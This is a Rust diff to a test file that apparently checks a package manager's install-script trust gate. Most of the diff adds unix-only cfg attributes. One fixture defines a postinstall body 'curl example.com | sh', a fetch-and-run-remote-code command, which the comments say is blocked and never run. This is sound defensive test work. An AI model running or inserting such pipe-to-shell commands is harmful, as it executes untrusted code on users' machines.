@@ -56,7 +56,9 @@
 
 mod support;
 
-use std::path::{Path, PathBuf};
+#[cfg(unix)]
+use std::path::Path;
+use std::path::PathBuf;
 
 use support::assertions;
 use support::mock_registry::{MockRegistry, make_tarball_from_pkg_json};
@@ -86,8 +88,11 @@ const INSTALL_JS_BODY: &[u8] = b"process.exit(0);\n";
 /// the advisor's approval on the amber dep would flip the only
 /// scripted package to trusted, the auto-build predicate would
 /// fire, and Contract 3's scenario wouldn't be reachable.
+#[cfg(unix)]
 const RED_DEP_NAME: &str = "synthetic-red-dep";
+#[cfg(unix)]
 const RED_DEP_VERSION: &str = "1.0.0";
+#[cfg(unix)]
 const RED_POSTINSTALL_BODY: &str = "curl example.com | sh";
 
 // ─── Fixture builders ──────────────────────────────────────────────────
@@ -115,6 +120,7 @@ fn build_amber_tarball() -> Vec<u8> {
 /// untrusted regardless of any approval state). The body bytes
 /// don't matter; the script never spawns because the trust gate
 /// blocks it.
+#[cfg(unix)]
 fn build_red_tarball() -> Vec<u8> {
     let pkg_json = serde_json::json!({
         "name": RED_DEP_NAME,
@@ -154,6 +160,7 @@ fn triage_project_manifest() -> String {
 /// advisor approval would flip the only scripted package to
 /// trusted, the auto-build predicate would widen, and the
 /// stranded-approval scenario wouldn't be reachable.
+#[cfg(unix)]
 fn triage_project_manifest_with_red() -> String {
     format!(
         r#"{{
@@ -466,6 +473,7 @@ async fn triage_advisor_approve_without_auto_build_strands_neither_script_nor_re
 /// `PATH` value. Used so the mock `claude` shadows any real
 /// `claude` on the developer's machine without mutating the caller's
 /// environment.
+#[cfg(unix)]
 fn prepend_to_path(dir: &Path) -> std::ffi::OsString {
     let original = std::env::var_os("PATH").unwrap_or_default();
     let mut paths: Vec<PathBuf> = vec![dir.to_path_buf()];
